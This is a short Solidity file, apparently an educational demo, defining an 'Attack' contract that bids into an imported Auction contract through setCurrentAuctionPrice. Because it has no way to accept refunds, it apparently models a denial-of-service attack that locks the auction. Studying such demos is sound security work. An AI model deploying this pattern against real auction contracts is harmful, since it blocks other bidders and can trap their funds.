//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Auction.sol";

contract Attack {
    Auction auctionContract;

    constructor(address _auctionAddress) {
        auctionContract = Auction(_auctionAddress);
    }

    function attack() public payable {
        auctionContract.setCurrentAuctionPrice{value: msg.value}();
    }
}
